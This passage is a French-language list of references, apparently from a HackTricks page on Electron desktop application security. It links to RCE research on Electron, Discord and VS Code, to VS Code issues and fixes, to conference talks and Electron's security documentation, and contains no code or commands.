- [7] [Charges utiles RCE nodeIntegration d’Electron](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE en un clic dans les applications Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Les dangers de shell.openExternal() d’Electron - de nombreux chemins vers l’exécution de code à distance](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Autorisez les URL arbitraires, attendez-vous à une exécution de code arbitraire](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Obtenir une RCE dans un célèbre outil de chat japonais grâce à une fonctionnalité Electron obsolète](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Exécution de code à distance](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Exécution de code à distance en mode restreint (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Vol de jeton GitHub en un clic via l’injection d’événements clavier dans VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Problème VS Code n° 319593 : les Webview peuvent déclencher des raccourcis clavier arbitraires dans l’espace de travail principal](https://github.com/microsoft/vscode/issues/319593)
- [16] [PR VS Code n° 319705 : confirmer l’ouverture des notebooks et cesser d’accepter le contexte installExtension fourni par l’appelant](https://github.com/microsoft/vscode/pull/319705)
- [17] [PR VS Code n° 319813 : bloquer la redistribution programmatique des événements clavier/clic des Webview dans les Webview de notebook](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / extensions d’espace de travail locales](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom : comment j’ai hacké tous les principaux IDE en 2 semaines](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt : prendre le contrôle d’applications de bureau populaires tout en découvrant une nouvelle surface d’attaque dans Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Sécurité d’Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [webPreferences de BrowserWindow d’Electron](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA : rétroconcevoir n’importe quoi](https://github.com/morluto/rea)
- [24] [Reconstruction d’artefacts JavaScript avec REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Flux de travail d’applications JavaScript multicouches avec REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
